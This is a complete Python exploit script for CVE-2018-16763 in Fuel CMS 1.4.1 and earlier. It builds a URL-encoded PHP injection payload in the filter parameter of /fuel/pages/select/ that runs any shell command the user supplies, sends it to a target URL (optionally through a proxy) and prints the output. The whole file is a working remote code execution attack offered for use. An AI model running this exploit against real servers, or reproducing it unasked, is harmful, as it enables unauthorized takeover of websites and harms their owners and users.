#! /usr/bin/env python3

# Fuel CMS Remote Code Execution Version  <= 1.4.1 (RCE)
# CVE : CVE-2018-16763
# Written By @shoamshilo 

import requests , sys 
import urllib
from urllib.parse import quote
import argparse

def prep_payload(url , cmd):
    return url + '/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27'+quote(cmd)+'%27%29%2b%27'

def send_payload(payload , proxy):
    if proxy:
        proxy = {"http": proxy}
        r = requests.get(payload , proxies=proxy)
        return r.text    
    r = requests.get(payload)
    return r.text

def start_up():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,epilog='Example: python ' + sys.argv[0] +  ' -u http://vulnsite.com -c whoami\nCreated By: @shoamshilo 2021 ')
    parser.add_argument('-u' , action='store' , dest='url' ,help='The url for the fuel cms application.')
    parser.add_argument('-c' , action='store' , dest='cmd' ,help='The command that you want to run.')
    parser.add_argument('--proxy' , action='store' , dest='proxy' ,help='Add a proxy passthrough.')
    return parser.parse_args()

if __name__ == '__main__':
    args = start_up()
    url = args.url
    cmd = args.cmd
    proxy = args.proxy

    print('[+] Prepering the payload')
    payload = prep_payload(url , cmd)
    responce = send_payload(payload , proxy)
    if responce:
        print('[+] Payload executed successfully')
        print(responce)